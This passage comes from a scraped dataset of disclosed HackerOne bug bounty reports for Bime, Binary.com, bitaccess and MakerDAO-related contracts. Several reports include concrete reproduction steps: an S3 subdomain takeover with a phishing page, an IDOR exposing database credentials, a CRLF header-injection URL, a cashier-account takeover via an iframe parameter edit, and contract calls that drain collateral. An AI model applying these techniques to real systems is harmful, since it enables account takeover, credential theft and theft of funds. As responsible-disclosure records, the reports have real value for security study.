11;; QUESTION SECTION:
12;a2.bime.io.			IN	A
13
14;; ANSWER SECTION:
15a2.bime.io.		59	IN	CNAME	bimeio.s3-website-us-east-1.amazonaws.com.
16bimeio.s3-website-us-east-1.amazonaws.com. 59 IN CNAME s3-website-us-east-1.amazonaws.com.
17s3-website-us-east-1.amazonaws.com. 4 IN A	54.231.11.130
18
19;; Query time: 210 msec
20;; SERVER: 8.8.8.8#53(8.8.8.8)
21;; WHEN: Tue Mar 08 15:33:45 EST 2016
22;; MSG SIZE  rcvd: 124

It points to an Amazon S3 bucket in the S3 US East 1 region. Visiting http://a2.bime.io revealed that the bucket did not exist (a 404 error was shown). Obviously this is not the case any longer, as the bucket is now claimed and serving a fake login page (see ""Attack Scenario"").
I created a bucket with name ""a2.bime.io"" on my S3 account in the US East 1 region.
I enabled static website hosting and pointed ""index.html"" as the index document.
Then I uploaded index.html (attached to this report) and clicked ""Make public"" to make sure it can be served. 
Now go to http://a2.bime.io and you will see a BIME login page. Click the Sign In button and you will notice it is a fake login form. 

Attack Scenario
I created a false login page and posted it on http://a2.bime.io. The login page looks just like the normal BIME sign in page, but it is 100% controlled by the attacker. The attacker could harvest logins by convincing their victims to visit the fake login page. Since it is a subdomain of bime.io, which BIME customers will recognize, it is likely they will fall for the attack. 
I have attached the fake login page here as index.html.
Remediation
Remove the a2.bime.io DNS entry so it no longer points to an S3 bucket Zendesk Ops doesn't control. If you need me to release a2.bime.io as an S3 bucket, let me know and I'll delete the bucket.1 attachment:F77313: index.htmlnoops43   posted a comment. Mar 8th (7 years ago)Hello @michiel,
Thank you for reporting this issue. The Zendesk Security Team will begin investigating the details of your report immediately. If the issue is verified as a security vulnerability, we will contact you with a timeline for remediation and the amount awarded for the submitted issue.
Regards,
Zendesk Security
    
    
        
            
                
                
                
            
        
    
michiel   posted a comment. Mar 9th (7 years ago)Thanks, I noticed this has been fixed now - great!
Code 678 BytesWrap lines Copy Download1michiel@msp ~ $ dig A a2.bime.io @8.8.8.8                                                                                                [2.1.8]
2
3; <<>> DiG 9.9.5-11ubuntu1.2-Ubuntu <<>> A a2.bime.io @8.8.8.8
4;; global options: +cmd
5;; Got answer:
6;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15324
7;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
8
9;; OPT PSEUDOSECTION:
10; EDNS: version: 0, flags:; udp: 512
11;; QUESTION SECTION:
12;a2.bime.io.			IN	A
13
14;; ANSWER SECTION:
15a2.bime.io.		299	IN	CNAME	bime.io.
16bime.io.		59	IN	A	52.73.251.176
17
18;; Query time: 135 msec
19;; SERVER: 8.8.8.8#53(8.8.8.8)
20;; WHEN: Wed Mar 09 17:30:53 EST 2016
21;; MSG SIZE  rcvd: 69
It no longer points to the Amazon S3 bucket I was able to take control of. Bime  rewarded michiel with a $150 bounty. Mar 12th (7 years ago)Hello @michiel,
Congratulations! Your submitted vulnerability has been validated and remediated. You will be awarded $150 and publicly thanked for the responsible disclosure on our Hall of Fame. 
Thank you for participating in the BIME Bug Bounty program. Please feel free to reach out if you have any questions or concerns.
Regards,
Zendesk Securitynoops43   closed the report and changed the status to Resolved. Mar 12th (7 years ago)michiel   requested to disclose this report. Jun 22nd (6 years ago)noops43   agreed to disclose this report. Jun 22nd (6 years ago)  This report has been disclosed. Jun 22nd (6 years ago)",https://hackerone.com/reports/121461,No value,No value,No value,2016,3,8,20,46
Bime,1001-5000,0.0,No value,"$1,000.00",No value,0.0,Information Disclosure,Urgent: attacker can access every data source on Bime,"jobert  submitted a report to Bime.Jul 8th (6 years ago)Vulnerability details
I don't include words like ""urgent"" in my title very often, but I thought you might want to get onto this right away. An attacker can access the data source of any other customer on the BIME platform through the /cube_models.json endpoint. This leaks, for example, the login information of Postgres backends (including hostname, login, and passwords). I haven't verified whether the passwords are encrypted, but this seems pretty bad nevertheless.
Proof of concept
Sign in as a normal user - I used my personal email address on the https://h1-bugbounty.bime.io domain. I added a CSV as data source to set up a new dashboard. During this flow, the following request is sent to the server:
Code 1.92 KiBWrap lines Copy Download1POST /cube_models.json HTTP/1.1
2Host: h1-bugbounty.bime.io
3...
4
5{""import_strategy"":""replace"",""configuration"":""{\""bimeDb\"":{\""arrayVarcharLength\"":500,\""numberOfDecimals\"":2},\""queryBlender\"":{\""pushdown\"":true,\""raiseWarnings\"":true},\""infiniteCache\"":{},\""timeZone\"":\""\"",\""mergeFields\"":\""\"",\""schedule\"":{\""cronExp\"":\""0 0 0 * * ?\"",\""cronText\"":\""Every day at 00 : 00\"",\""emailOnSuccess\"":false,\""emailOnFailure\"":false,\""refreshRate\"":\""importNow\""},\""bundle\"":{},\""sortWeekdayFromMonday\"":true}"",""model_category_id"":527921,""name"":""CSV Connection 1"",""cache_type"":""dejaVu"",""use_cache"":true,""datasource_id"":723592,""technical_type"":""filePicker"",""in_memory_cache_time_to_live"":15,""cube_schema"":""PE9MQVBTY2hlbWEgZm9sZGVycz0iZXlKaGRIUnlhV0oxZEdWelJtOXNaR1Z5Y3lJNlcxMHNJbTFsWVhOMWNtVnpSbTlzWkdWeWN5STZXMTBzSW0xbFlYTjFjbVZ6Um05c1pHVnljMFJwYzNCc1lYbEdiM0p0WVhSeklqcGJYWDA9IiBsYWJlbD0iY3N2Y29ubmVjdGlvbjEtYmU2ODgiIGlzTGFyZ2VNb2RlbD0iZmFsc2UiIGFycmF5Q29sdW1ucz0iVzEwPSIgPjxEaW1lbnNpb25zPjxEaW1lbnNpb24gbGFiZWw9IkF4aXMgb2YgYW5hbHlzaXMiIGRpc3BsYXlOYW1lPSJBeGlzIG9mIGFuYWx5c2lzIiBpZD0iQXhpcyBvZiBhbmFseXNpcyI+PEF0dHJpYnV0ZXM+PEF0dHJpYnV0ZSBsYWJlbD0iSUQiIGRlc2NyaXB0aW9uPSJJRCIgZGlzcGxheU5hbWU9IklEIiBmb2xkZXJJbmRleD0iMCIgb3JpZ2luYWxEaXNwbGF5TmFtZT0iSUQiIHJlYWxUeXBlPSJtZWFzdXJlIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjxBdHRyaWJ1dGUgbGFiZWw9InRpdGxlIiBkZXNjcmlwdGlvbj0idGl0bGUiIGRpc3BsYXlOYW1lPSJ0aXRsZSIgZm9sZGVySW5kZXg9IjAiIG9yaWdpbmFsRGlzcGxheU5hbWU9InRpdGxlIiByZWFsVHlwZT0iY3VzdG9tIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjwvQXR0cmlidXRlcz48L0RpbWVuc2lvbj48L0RpbWVuc2lvbnM+PE1lYXN1cmVzIGRpc3BsYXlGb3JtYXQ9InN0YW5kYXJkX1dBQ18wX1dBQ18xMDAwX1dBQ19fV0FDX19XQUNfLl9XQUNfIF9XQUNfMV9XQUNfIj48L01lYXN1cmVzPjxDYWxjdWxhdGVkRmllbGRzPjxDYWxjdWxhdGVkTWVhc3VyZXM+PC9DYWxjdWxhdGVkTWVhc3VyZXM+PENhbGN1bGF0ZWRBdHRyaWJ1dGVzPjwvQ2FsY3VsYXRlZEF0dHJpYnV0ZXM+PC9DYWxjdWxhdGVkRmllbGRzPjwvT0xBUFNjaGVtYT4=""}
Notice the datasource_id in this request. Send this request to the server again, but this time, change the ID to the data source that you want to access. You don't need to know the actual type of the datasource. After this, send a GET request to the /datasources.json endpoint, like shown below.
Code 61 BytesWrap lines Copy Download1GET /datasources.json HTTP/1.1
2Host: h1-bugbounty.bime.io
3...
Code 989 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2...
3
4[...
5{
6  ""id"": 723591,
7  ""technical_type"": ""Relational Databases"",
8  ""external_id"": ""█████████.db.databaselabs.io"",
9  ""login"": ""bot"",
10  ""email"": null,
11  ""tocken"": ""true"",
12  ""url"": ""█████████"",
13  ""public_key"": ""customSQL"",
14  ""private_key"": ""true"",
15  ""extra_param1_name"": ""dbPort"",
16  ""extra_param1_value"": ""5432"",
17  ""extra_param2_name"": null,
18  ""extra_param2_value"": ""postgreSQL"",
19  ""extra_param3_name"": null,
20  ""extra_param3_value"": ""██████████"",
21  ""created_at"": ""2016-07-08T03:09:29.000Z"",
22  ""updated_at"": ""2016-07-08T03:35:36.000Z"",
23  ""datasource_version"": 2,
24  ""configuration"": ""{\""invalidDateAs\"":\""null\"",\""meta\"":{\""useReusableToken\"":true},\""cloudStorage\"":{\""bigQuery\"":{},\""redshift\"":{\""useEscapingV2\"":true},\""useEscapingV2\"":true},\""sqlServerLocale\"":\""english\"",\""union\"":{},\""useBifeV2\"":true,\""sqlVersion\"":2,\""joinCulling\"":true,\""usePushDown\"":true,\""jdbcParameters\"":[],\""useCache\"":false}"",
25  ""final_type"": ""postgresql"",
26  ""pwd"": ""██████████""
27},
28...]
This will give the attacker access to every datasource on the BIME platform. It'll also be reflected on the datasources page, when signed in to the platform:
Image F103801: Screen_Shot_2016-07-07_at_20.39.52.png 63.36 KiBZoom in Zoom out Copy Download
Let me know if you need more information.1 attachment:F103801: Screen_Shot_2016-07-07_at_20.39.52.pngxs411   posted a comment. Jul 8th (6 years ago)Hello,
Thank you for reporting this issue. The Zendesk Security Team will begin investigating the details of your report immediately. If the issue is verified as a security vulnerability, we will contact you with a timeline for remediation and the amount awarded for the submitted issue.
Regards,
Zendesk SecurityBime  rewarded jobert with a $1,000 bounty. Jul 9th (6 years ago)Hello @jobert,
Thank you for brining this to our attention. Your submitted vulnerability has been validated and is in process for remediation. Also, you will be awarded $1000 and publicly thanked for the responsible disclosure on our Hall of Fame.
We're still working on the fix and hope to have an update soon.
Regards,
Zendesk Securitynoops43   changed the status to Triaged. Jul 9th (6 years ago)noops43   posted a comment. Jul 14th (6 years ago)Hello @jobert,
Your submitted issue has been remediated. Can you also verify the fix before we resolve this bug?
Regards,
Zendesk Security
    
    
        
            
                
                
                
            
        
    
jobert   posted a comment. Jul 14th (6 years ago)Hi @noops43 - this seems fixed. The server now returns a 401 Unauthorized response when I use a datasource ID that is not owned by me. Nice job!noops43   closed the report and changed the status to Resolved. Jul 15th (6 years ago)Awesome! Thank you for participating in the BIME Bug Bounty program. Please feel free to reach out if you have any questions or concerns.
Regards,
Zendesk Security
    
    
        
            
                
                
                
            
        
    
jobert   requested to disclose this report. Jul 15th (6 years ago)Hi @noops43 - I'd like to disclose this report. You responded adequately and fast and I think it's a good show case to show how BIME deals with security reports. There was some data in the original report that should stay confidential, so I removed that to avoid disclosing that to the public. Thanks and I look forward to submit more reports to you one day!noops43   posted a comment. Jul 19th (6 years ago)Hi @jobert,
We are still working on a few action items on our end. We will get back to you as soon as we have more information regarding this issue. 
Regards,
Zendesk Securitynoops43   agreed to disclose this report. Jul 27th (6 years ago)  This report has been disclosed. Jul 27th (6 years ago)",https://hackerone.com/reports/149907,No value,No value,No value,2016,7,8,3,53
Bime,1001-5000,0.0,No value,$100.00,No value,0.0,None,The JDBC driver used by the Vertica connector allows to create files on the backends,agarri_fr  submitted a report to Bime.Jan 22nd (7 years ago)noops43   posted a comment. Jan 22nd (7 years ago)noops43   changed the status to Triaged. Jan 27th (7 years ago)agarri_fr   posted a comment. Feb 25th (7 years ago)Bime  rewarded agarri_fr with a $100 bounty. Feb 25th (7 years ago)noops43   closed the report and changed the status to Resolved. Feb 25th (7 years ago)agarri_fr   requested to disclose this report. Aug 15th (6 years ago)noops43   agreed to disclose this report. Sep 14th (6 years ago)  This report has been disclosed. Sep 14th (6 years ago),https://hackerone.com/reports/112166,No value,No value,No value,2016,1,22,4,9
Bime,1001-5000,0.0,No value,$750.00,No value,0.0,Information Disclosure,XXE in the Connector Designer,agarri_fr  submitted a report to Bime.Jan 21st (7 years ago),https://hackerone.com/reports/112116,No value,No value,No value,2016,1,21,21,31
Binary.com,51-100,0.0,10m-50m,$50.00,No value,0.0,UI Redressing (Clickjacking),CJ vulnerability in subdomain,0x0ameer  submitted a report to Binary.com.May 23rd (6 years ago)Summary by 0x0ameerWriteUp - http://ameeras.me/Binary-Clickjacking-vulnerability/,https://hackerone.com/reports/140392,Selangor,Malaysia,Shah Alam,2016,5,23,0,1
Binary.com,51-100,0.0,10m-50m,$75.00,No value,0.0,Improper Authentication - Generic,Cookie bug,blinkms  submitted a report to Binary.com.Nov 25th (7 years ago),https://hackerone.com/reports/101983,Selangor,Malaysia,Shah Alam,2015,11,25,10,55
Binary.com,51-100,0.0,10m-50m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Cross Site Scripting,tuckercarlson  submitted a report to Binary.com.Oct 24th (7 years ago),https://hackerone.com/reports/95599,Selangor,Malaysia,Shah Alam,2015,10,24,13,28
Binary.com,51-100,0.0,10m-50m,$75.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Cross site scripting ,an0n-j  submitted a report to Binary.com.Aug 12th (6 years ago),https://hackerone.com/reports/158757,Selangor,Malaysia,Shah Alam,2016,8,12,9,42
Binary.com,51-100,0.0,10m-50m,$50.00,No value,0.0,Improper Authentication - Generic,Email Verification Link can be Used as Password Reset Link!,"karimrahal  submitted a report to Binary.com.Nov 7th (7 years ago)Hello again!
basically,I have found a new issue which allows attacker to use a Email Verification Link and make it into a password reset link!
Proof Of Concept:
When you Send a Email Verification Link
It looks like this ""https://www.binary.com/user/validate_link?step=account&verify_token=q4b4QVyLZD9daVpAdiXAIiAExC8DaGmqFPk8wNt9nTqAm7Pa&l=EN""
Remove ""step=account"" from the URL, and tadaa! you will see once u enter the email you can change password!
Thank you,
-KarimSummary by karimrahalI was able to turn an email verification link into a password reset link.
Proof Of Concept:
https://www.binary.com/user/validate_link?step=account&verify_token=q4b4QVyLZD9daVpAdiXAIiAExC8DaGmqFPk8wNt9nTqAm7Pa&l=EN
Remove ""step=account"" from the URL, then enter your email. After entering your email, you will be able to reset your password.",https://hackerone.com/reports/98469,Selangor,Malaysia,Shah Alam,2015,11,7,15,43
Binary.com,51-100,0.0,10m-50m,$250.00,No value,0.0,None,Full takeover of some binary.com sub domains,koenrh  submitted a report to Binary.com.Jan 22nd (7 years ago),https://hackerone.com/reports/112306,Selangor,Malaysia,Shah Alam,2016,1,22,17,15
Binary.com,51-100,0.0,10m-50m,$75.00,No value,0.0,None,Http Response Splitting - Validate link,"gerben_javado  submitted a report to Binary.com.Oct 26th (7 years ago)So i found a http response splitting issue in your website. If we visit the following url:
https://www.binary.com/user/validate_link?step=account&verify_token=sometoken
We will get a response header that says: 
    Set-Cookie: verify_token=sometoken; expires=Wed, 28 Oct 2015 23:31:35 GMT; domain=.binary.com; path=/; secure
However this value doesnt seem to be urlencoded which gives the attacker the option to create his own response header. For example if you were to visit:
https://www.binary.com/user/validate_link?step=account&verify_token=%0aSet-Cookie:%20GerbenJavado=Awesome;%0a
The following response header will be included in the response: (shameless plug)
    Set-Cookie: GerbenJavado=Awesome;
Attacker Scenario
Since this attack doesnt require any user interaction to be exploited, a attacker could do lots of fun stuff using this vulnerability by including a malicious url in a Iframe or even in a IMG tag. 

As the example shows the attacker can set cookies for the user on binary.com
The attacker can disable or bypass security headers placed by the server

One restricition the attacker has is that the request is a redirect. This made it for me impossible to XSS attacks or Cache Poisining. Maybe you guys could look a bit into this further. However i would argue that because of the fact user interaction is not needed and the fact that the attacker can set his own headers (including cookies) the attack is fairly scary.",https://hackerone.com/reports/95981,Selangor,Malaysia,Shah Alam,2015,10,26,23,48
Binary.com,51-100,0.0,10m-50m,$50.00,Low,2.0,Violation of Secure Design Principles,Leaking Referrer in Reset Password Link,flex0geek  submitted a report to Binary.com.Dec 12th (5 years ago),https://hackerone.com/reports/297198,Selangor,Malaysia,Shah Alam,2017,12,12,7,44
Binary.com,51-100,0.0,10m-50m,$300.00,No value,0.0,Improper Authentication - Generic,login to any user's cashier account and full account information disclosure,"zombiehelp54  submitted a report to Binary.com.Nov 6th (7 years ago)Hi , I have found an  issue allowing an attacker to login to any user's cashier account and view sensitive user information by just knowing the user account ID.
#Steps to reproduce:


open 2 browsers and create 2 accounts , login with each account on a browser.


let's call account 1 , the victim and account 2 is the attacker.


from the victim account , make sure you are using real account and then go to https://www.binary.com/cashier then click Deposit then click Continue. 


From the attacker account go to https://www.binary.com/cashier then click Deposit then click Continue. 


Now you'll see your cashier account , inspect the page elements using your browser inspector then find the <iframe> tag with the id attribute cashiercont. it will look like this : 


Code 345 BytesWrap lines Copy Download1<iframe src=""https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&amp;PIN=CR342435&amp;Lang=en&amp;Password=0e552ae717a1d08cb147f132a31676559e3273ef&amp;Secret=1328d47abeda2b672b6424093c4dbc76&amp;Action=DEPOSIT"" frameborder=""0"" width=""100%"" height=""2000"" id=""cashiercont"" scrolling=""auto"" style=""padding:0px;margin:0px;""></iframe>

Edit the <iframe> element and Change the PIN parameter value to the victim account id value  so it should be like this after the edit:

Code 356 BytesWrap lines Copy Download1<iframe src=""https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&amp;PIN=<VICTIM_ACCOUNT_ID>&amp;Lang=en&amp;Password=0e552ae717a1d08cb147f132a31676559e3273ef&amp;Secret=1328d47abeda2b672b6424093c4dbc76&amp;Action=DEPOSIT"" frameborder=""0"" width=""100%"" height=""2000"" id=""cashiercont"" scrolling=""auto"" style=""padding:0px;margin:0px;""></iframe>

Now you have successfully logged in the victim's cashier account , to view the victim account details , click the cashier button then next to the customer name click the view link and you'll see all the account details of the victim , including Full name , email and phone number which are the most sensitive here since they can be used in phishing.

Please tell me if you are having any issue reproducing this.
ThanksSummary by zombiehelp54This bug allowed an attacker to login to any user's cachier account , view the user full account details and withdraw money from the user's account to the attacker's credit card , skrill ..etc.
http://zombiehelp54.blogspot.com/2015/11/binarycom-critical-vulnerability-to.html",https://hackerone.com/reports/98247,Selangor,Malaysia,Shah Alam,2015,11,6,12,3
bitaccess,11-50,0.0,No value,$50.00,No value,0.0,Violation of Secure Design Principles,BYASSING  OTP Verification,geekboy  submitted a report to bitaccess.Apr 13th (7 years ago)geekboy   posted a comment. Apr 13th (7 years ago)allan   posted a comment. Apr 14th (7 years ago)bitaccess_moe bitaccess staff  posted a comment. Apr 14th (7 years ago)geekboy   posted a comment. Apr 14th (7 years ago)bitaccess_moe bitaccess staff  closed the report and changed the status to Resolved. Apr 14th (7 years ago)bitaccess  rewarded geekboy with a $50 bounty. Apr 14th (7 years ago)geekboy   requested to disclose this report. Jun 18th (6 years ago)shayan   agreed to disclose this report. Jun 22nd (6 years ago)  This report has been disclosed. Jun 22nd (6 years ago),https://hackerone.com/reports/130460,No value,No value,No value,2016,4,13,22,35
bitaccess,11-50,0.0,No value,$200.00,No value,0.0,None,"EXTREMELY URGENT: Missing control of bitcoin amount when selling bitcoin allows a user to withdraw any amount of money, unrestricted.","cablej  submitted a report to bitaccess.Jun 13th (6 years ago)Summary by cablejOn cash.bitaccess.co, the endpoint for selling bitcoin did not verify the posted amounts of bitcoin and USD. This resulted in users being allowed to sell extremely small amounts of bitcoin for any amount of USD, potentially compromising any bitcoin ATM. Response was speedy on bitaccess's side and this issue is now fixed.",https://hackerone.com/reports/144526,No value,No value,No value,2016,6,13,18,37
BlockDev Sp. Z o.o,1001-5000,0.0,200m-1b,"$50,000.00",Critical,9.5,Improper Input Validation,Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`,"lucash-dev  submitted a report to BlockDev Sp. Z o.o.Aug 29th (3 years ago)Summary:
The flip contract allows for the MCD system to auction collateral in exchange for DAI.
A lack of validation in the method flip.kick allows an attacker to create an auction with a fake
bid value. Since the end contract trusts that value, it can be exploited to issue any amount of free
DAI during liquidation. That DAI can then be immediately used to obtain all collateral stored in the
end contract.
Detailed Description:
The flipper contract (flip.sol) is intended to offer a way for the MCD contracts to obtain DAI by auctioning gems. An auction is initiated by calling the flip.kick method, which is normally done by the cat contract when it grabs collateral from a CDP.
The implementation of that method, however, completely lacks access control and has very little validation -- in particular, it's possible to execute the method even during the liquidation phase.
On top of that, all values stored in the auction are accepted as parameters of the method, including the bid amount. By directly calling the method, a malicious user can create a ""fake"" auction, with an arbitrary initial bid value, without spending the corresponding DAI.
Though that technique could be used to cause other damage, I will focus this report on the maximum-impact effect by exploiting it during the liquidation phase, in an attack vector that leads to transferring all collateral to the attacker.
First, the system must be in the liquidation phase, after end.flow is called to fix the exchange rate for redeeming collateral. Then the attacker performs three actions as follows:


Create a ""fake"" auction, by calling flip.kick. The bid parameter of the method can be set to any arbitrarily large value, in special a value at least equal to the total supply of DAI. The lot parameter, on the other hand, can be arbitrarily small, as long as it's not zero.


The attacker calls end.skip. The end contract will try to return the bid amount to the attacker. This will result in the issuance -- for free -- of DAI to the attacker, in any amount entered during step 1.


The attacker calls end.pack and end.cash thus converting the DAI into collateral. If the amount entered in step 1 is the total supply of DAI, the attacker will obtain ALL collateral stored in the end contract.


Steps To Reproduce:
I've attached to this report a modified version of end.t.sol which contains a test (test_steal_all_collateral_using_flipper) that reproduces the attack.
Please don't hesitate to contact me if you need help understanding the test or reproducing the issue.
Impact
The issue described in this report allows an attacker to steal ALL collateral stored in the MCD system during the liquidation phase -- possibly within a single transaction. This would result in a complete loss of funds for all users.
The cost of performing the attack is almost zero -- just the minimal denomination of each type of gem stolen plus gas.
Given the above I understand the issue has Critical severity, and fully qualifies for the corresponding bounty.1 attachment:F569307: end-flip-exploit.t.sollasse_y44rf   posted a comment. Aug 29th (3 years ago)Thanks, lucash-dev! We will investigate and return here.h1_analyst_ava HackerOne triage  posted a comment. Aug 30th (3 years ago)Hi @lucash-dev,
Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Kind regards,
@sodacaniamchrissmith   changed the status to Triaged. Sep 5th (3 years ago)We are investigating this and will get back to you sooniamchrissmith   closed the report and changed the status to Resolved. Updated Sep 26th (3 years ago)@lucash-dev, another really great bug! 
We have evaluated this and agree that leaving the Flip.kick function publicly callable opens an attack vector that could allow significant collateral loss during the End. 
We really appreciate you catching this bug and are accepting it as our first Critical finding in the program.  We are awarding you the full $50,000 bounty. Congratulations!
We need to process this as an invoice and it will require a bank transfer.  Please be patient with us as we get those steps taken care of.  I will keep you posted, but we expect it to be done early next week.
In the meantime, we implemented a fix for the bug here).
Once we have the bounty paid, I'll put in a request for disclosure too. 
Thank you and, as always, we look forward to hearing about any other bugs you discover!
    
    
        
            
                
                
                
            
        
    
lucash-dev   posted a comment. Sep 26th (3 years ago)Hi, @iamchrissmith.
Thank you very much for the bounty! That's really great news! I'll take a look at the fix.BlockDev Sp. Z o.o  rewarded lucash-dev with a $50,000 bounty. Oct 1st (3 years ago)ACH came through.  Congratulations again on this great find! Will request disclosure and look forward to hearing your thoughts on the fix and any thing else you spot in the code.iamchrissmith   requested to disclose this report. Oct 1st (3 years ago)
    
    
        
            
                
                
                
            
        
    
lucash-dev   agreed to disclose this report. Oct 1st (3 years ago)Hi, @iamchrissmith.
Thanks again for the bounty and the feedback. The fix lgtm. I'm disclosing it.  This report has been disclosed. Oct 1st (3 years ago)",https://hackerone.com/reports/684092,Masovian Voivodeship,Poland,Warsaw,2019,8,29,2,40
BlockDev Sp. Z o.o,1001-5000,0.0,200m-1b,"$5,000.00",High,7.95,Improper Input Validation,Steal all MKR from `flap` during liquidation by exploiting lack of validation in `flap.kick`,"lucash-dev  submitted a report to BlockDev Sp. Z o.o.Aug 29th (3 years ago)Summary:
The flap contract provides the ability to auction DAI for MKR. That's a fundamental functionality of the MCD system, invoked usually from the vow contract.
A flaw in the validation of calls to flap.kick, however, allows a malicious user to create ""fake' auctions that can be later used to steal MKR from flap during the liquidation (end) phase.
Detailed description
The method flap.kick, used to start an auction of DAI (for MKR) in the flap contract, lacks any validation of the bid parameter. Since the method is public, a malicious user can directly invoke it, passing an arbitrary bid parameter -- affecting other contracts that assume this value represents the highest bid in the auction.
While it's possible that this issue will cause other problems, in this report I'll focus on what seems to be the highest severity attack enabled by it.
The attack consists of two parts:
1 - During the normal operation of the MCD system (contracts not ""caged""), the attacker will create one or more ""fake"" auctions by calling flap.kick. The bid parameter can be arbitrarily large, and won't be validated in any way. On the other hand, the lot parameter can be arbitrarily small, as long as it's not zero, which means the auction can be placed with almost zero cost.
2 - After governance calls end.cage, the auctions are stopped -- but any MKR deposited in the flap contract for any outstanding auction will still be there until someone calls yank for each one.
At this point, the attacker can call flap.yank for his own ""fake"" auctions, and that will result in him getting MKR transferred from the flap contract to himself -- in whatever amount was specified as bid in step 1.
Since the attacker might no know beforehand, it would be wise for them to create multiple ""fake"" auctions. In particular, an exponential series of auctions, with bid values 1, 2, 4, 8, 16... will allow the attacker to extract any exact amount of MKR from the flap contract.
Steps To Reproduce:
I've attached to this report a modified version of end.t.sol which contains a test (the last one, test_steal_mkr_from_flapper) that reproduces this attack.
Please don't hesitate to contact me if you have any trouble understanding or reproducing this issue.
Impact
This issue allows an attacker to steal arbitrary amounts of MKR deposited for auction.
That impact is particularly troubling, as MKR tokens are used to govern the platform, and anyone maliciously obtaining large quantities of these tokens might use them to further affect other core functionalities, potentially leading to stealing collateral, DAI etc. Also, because the same MKR token might be used for governance of future versions of the contracts, the damage might be much more enduring and harder to mitigate.
Given the above, and the minimal cost for perpetrating the attack, this issue would normally be classified as Critical. The specific policies for this program, though, won't allow for that, since this attack doesn't steal collateral directly. So, I classified the severity as High.1 attachment:F569418: steal-mkr-flap.t.sollasse_y44rf   posted a comment. Aug 29th (3 years ago)Thanks, lucash-dev! We will investigate and return here.h1_analyst_ava HackerOne triage  posted a comment. Aug 30th (3 years ago)Hi @lucash-dev,
Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Kind regards,
@sodacaniamchrissmith   changed the status to Triaged. Sep 5th (3 years ago)We are investigating this and will get back to you soonBlockDev Sp. Z o.o  rewarded lucash-dev with a $5,000 bounty and a $5,000 bonus. Sep 25th (3 years ago)@lucash-dev, again, thank you much for finding this bug. 
We agree with you that this does not meet the requirements of a Critical bug as it does not involve collateral.  However, because it results in MKR token being stolen, we felt it was higher than the baseline ""High"" severity award. 
We implemented a fix for the bug here, would like to disclose your report. 
Thank you and we look forward to hearing about any other bugs you discover!iamchrissmith   closed the report and changed the status to Resolved. Sep 25th (3 years ago)iamchrissmith   requested to disclose this report. Sep 25th (3 years ago)
    
    
        
            
                
                
                
            
        
    
lucash-dev   agreed to disclose this report. Sep 26th (3 years ago)Hi, @iamchrissmith.
Thank you very much for the bounty! I'm agreeing to the disclosure.
Hope to keep contributing to your program in the future!  This report has been disclosed. Sep 26th (3 years ago)",https://hackerone.com/reports/684152,Masovian Voivodeship,Poland,Warsaw,2019,8,29,7,18
BlockDev Sp. Z o.o,1001-5000,0.0,200m-1b,"$25,000.00",High,7.95,Business Logic Errors,"Steal collateral during `end` process, by earning DSR interest after `flow`.","lucash-dev  submitted a report to BlockDev Sp. Z o.o.Aug 13th (3 years ago)Summary:
The end contract in MCD controls the process of shutting down
the MCD contracts and allowing for users to redeem their DAI for
collateral -- presumably to migrate to a new implementation of DAI.
The process, however, doesn't prevent the continued functioniong
of DAI savings accounts (pot contract), which allows for continued
minting of DAI after all other contracts have been ""caged"", resulting
in theft (possibly involuntary) of collateral.
Detailed Description
The end contract is responsible for orchestrating the complex sequence
of steps for shutting down the MCD eco-system, settling all existing DAI
into collateral during the process.
The first step in the process is the method cage, which ensures that other
MCD contracts stop operating in the normal way, and enter a ""not-live"" mode.
In particular, the vat contract is updated to prevent the creation of new
CDP's, and also prevents the accrual of interest (vat.fold). This is obtained by
calling the cage method in the vat contract.
Puzzingly, however, the end.cage method doesn't affect the state of the pot
(savings account) contract, allowing for interests to be continuously earned
-- and new DAI to be minted --indefinitely during all the phases of the end
process. Most significantly, it allows a user to mint new DAI even after the
final DAI/collateral rate has been fixed (end.flow).
The consequence is that it's possible to inflate the DAI supply so that there
isn't enough collateral for all of it to be redeemed. In that case the last
users to try to redeem will have their collateral stolen by the faster ones, as
they might well be unable to redeem any DAI at all.
An example might help clarify the problem:


Suppose there are two users, Ali and Bob, who each control 50% percent of the
DAI supply, lets say 10 DAI each.


Now let's assume the end process is initiated and proceeds as usual --
eventually reaching the flow stage, with a fixed exchange rate of 1 DAI / ETH.


Let's also assume that there is a DSR rate of 100% a month (unrealistic, but makes
the numbers easier).


After the end.flow is called, Ali notices that the he can still use pot to earn
interests, so he deposits all his DAI in pot. Meanwhile Bob can't do the same
as his funds are locked inside a Dapp (let's say an Augur market).


After one month, Ali calls pot.exit and gets back 20 DAI. That corresponds to
the total original supply of DAI before end.flow was called. So, Ali calls
end.pack and end.cash to convert his 20 DAI into 20 ETH -- all the collateral
in the MCD contracts.


When Bob tries to redeem his DAI, there is no collateral left. His end.cash
calls fail and he ends up with no tokens -- DAI or ETH -- at all.


Steps to Reproduce
I've attached to this report a version of end.t.sol that adds a test scenario
(test_steal_collateral_using_dsr_after_thaw) to reproduce this attack (in fact, the example above).
Please don't hesitate to contact me if you need more help reproducing it.
Possible Remediation
The issue could be completely prevented by introducing a cage functionality into
the pot contract, and not allowing the pot.drip method to be called when
not in live mode.
Please note that the above solution is provided as proof that the reported issue
is fixable. I make no claim that the above is the best available solution.
Impact
Please refer to the ""Impact Analysis"" field for more details.
Final Note
Please don't hesitate to contact me if you need any further clarification around
this issue, or help reproducing and evaluating it.
Impact
Impact Analysis
As clearly demonstrated above, the reported bug can be used to steal collateral
from the end contract. Even more disturbingly, the bug can likely cause users
that own DSR deposits to unwittingly steal collateral in case of a shutdown.
Let's evaluate how much collateral can be stolen in this scenarios. The amount
stolen depends on three factors:
1 - DSR savings rate.
